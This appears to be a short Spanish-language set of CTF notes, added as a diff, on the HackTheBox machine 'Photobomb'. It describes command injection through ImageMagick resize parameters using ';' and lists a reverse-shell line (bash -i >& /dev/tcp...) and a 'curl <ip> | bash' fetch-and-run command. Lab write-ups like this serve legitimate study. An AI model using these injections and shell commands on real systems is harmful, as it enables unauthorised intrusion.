@@ -1,0 +1,12 @@
+	####Image hacking
+maquina: photobomb en HTB
+	###Command injection
+#El reescalado de una imagen en linux puede hacerse con
+convert nombre -resize proporciones nombre
+#Se podria intentar ejecutar comandos si a la peticion se le adjunta uno con ; en diferentes partes de la misma como en el nombre, la extension o el escalado (cambiando los parametros de la peticion que se esta haciendo, no header).
+En este punto se podrian inyectar comandos para poder recibir una shell.
+Compartiendo mediante un server http nuestra reverse shell (bash -i >& /dev/tcp....) se podria inyectar un curl <ip server http> | bash para obtener una shell
+Tambien se podria descarar y ejecutarlo de forma local en la maquina que estamos atacando
+
+
+
